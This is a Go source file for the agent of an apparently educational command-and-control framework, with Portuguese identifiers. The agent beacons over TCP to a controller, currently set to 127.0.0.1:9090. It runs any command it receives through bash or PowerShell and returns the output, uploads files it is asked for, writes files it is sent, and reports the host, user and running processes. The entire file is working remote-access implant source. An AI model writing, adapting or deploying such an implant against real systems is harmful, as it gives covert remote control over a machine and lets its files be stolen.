package main

import (
	"crypto/md5"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/mitchellh/go-ps"
)

const (
	SERVIDOR = "127.0.0.1"
	PORTA    = "9090"
)

var (
	mensagem    estruturas.Mensagem
	tempoEspera = 5
)

func init() {
	mensagem.AgentHostname, _ = os.Hostname()
	mensagem.AgentCWD, _ = os.Getwd()
	mensagem.AgentID = geraID()
}

func main() {
	log.Println("Entrei em Execução...")

	for {
		canal := conectaServidor()
		defer canal.Close()

		// Enviando a mensagem para o servidor
		gob.NewEncoder(canal).Encode(mensagem)
		mensagem.Comandos = []estruturas.Commando{}
		// Recebendo a mensagem do servidor
		gob.NewDecoder(canal).Decode(&mensagem)

		if mensagemContemComandos(mensagem) {
			for indice, comando := range mensagem.Comandos {
				mensagem.Comandos[indice].Resposta = executaComando(comando.Comando, indice)
			}
		}

		time.Sleep(time.Duration(tempoEspera) * time.Second)
	}
}

func executaComando(comando string, indice int) (resposta string) {
	comandoSeparado := helpers.SeparaComando(comando)
	comandoBase := comandoSeparado[0]

	switch comandoBase {
	case "ls":
		resposta = listaArquivos()
	case "pwd":
		resposta = listaDiretorioAtual()
	case "cd":
		if len(comandoSeparado[1]) > 0 {
			resposta = mudarDeDiretorio(comandoSeparado[1])
		}
	case "whoami":
		resposta = quemSouEu()
	case "ps":
		resposta = listaProcessos()
	case "send":
		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
	//case "get":
	//	resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)
	case "get":
		if len(comandoSeparado) > 1 {
			nomeArquivo := strings.TrimSpace(strings.TrimPrefix(comando, "get"))
			resposta = enviarArquivo(nomeArquivo, indice)
		}
	case "sleep":
		tempoEspera, _ = strconv.Atoi(strings.TrimSpace(comandoSeparado[1]))
	default:
		resposta = executaComandoEmShell(comando)
	}

	return resposta
}

//func enviarArquivo(comandoGet string, indice int) (resposta string) {
//	var err error
//	resposta = "Arquivo enviado com sucesso."
//	comandoSeparado := helpers.SeparaComando(comandoGet)
//	fmt.Println("comandoSeparado:", comandoSeparado[1])
//	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
//	if err != nil {
//		resposta = "Erro ao copiar o arquivo: " + err.Error()
//		mensagem.Comandos[indice].Arquivo.Erro = true
//	}
//	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
//
//	return resposta
//}

func enviarArquivo(nomeArquivo string, indice int) (resposta string) {
	var err error
	resposta = "Arquivo baixado com sucesso!"

	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(nomeArquivo)

	if err != nil {
		resposta = "Erro ao copiar o arquivo: " + err.Error()
		mensagem.Comandos[indice].Arquivo.Erro = true
		return resposta
	}
	mensagem.Comandos[indice].Arquivo.Nome = nomeArquivo

	return resposta
}

func salvaArquivoEmDisco(arquivo estruturas.Arquivo) (resposta string) {
	resposta = "Arquivo enviado com sucesso!"

	err := os.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)

	if err != nil {
		resposta = "Erro ao salvar arquivo no destino: " + err.Error()
	}

	return resposta
}

func executaComandoEmShell(comandoCompleto string) (resposta string) {
	if (runtime.GOOS) == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
		resposta = string(output)
	} else {
		if (runtime.GOOS) == "linux" {
			output, _ := exec.Command("/bin/bash", "-c", comandoCompleto).CombinedOutput()
			resposta = string(output)
		}
		// Linha nula
	}
	return resposta

}

func listaProcessos() (processos string) {
	listaDeProcessos, _ := ps.Processes()

	for _, processo := range listaDeProcessos {
		processos += fmt.Sprintf("%d -> %d -> %s \n", processo.PPid(), processo.Pid(), processo.Executable())
	}

	return processos
}

func quemSouEu() (meuNome string) {
	usuario, _ := user.Current()
	meuNome = usuario.Username
	return meuNome

}

func mudarDeDiretorio(novoDiretorio string) (resposta string) {
	resposta = "Diretorio corrente alterado com sucesso"
	err := os.Chdir(novoDiretorio)

	if err != nil {
		resposta = "O diretorio" + novoDiretorio + " não existe."
	}

	return resposta
}

func listaDiretorioAtual() (diretorioAtual string) {
	diretorioAtual, _ = os.Getwd()
	return diretorioAtual
}

func listaArquivos() (resposta string) {
	arquivos, _ := ioutil.ReadDir(listaDiretorioAtual())

	for _, arquivo := range arquivos {
		resposta += arquivo.Name() + "\n"
	}

	return resposta
}

func mensagemContemComandos(mensagemDoServidor estruturas.Mensagem) (contem bool) {
	contem = false

	if len(mensagemDoServidor.Comandos) > 0 {
		contem = true
	}

	return contem

}

func conectaServidor() (canal net.Conn) {
	canal, _ = net.Dial("tcp", SERVIDOR+":"+PORTA)
	return canal
}

func geraID() string {
	myTime := time.Now().String()

	hasher := md5.New()
	hasher.Write([]byte(mensagem.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))

}
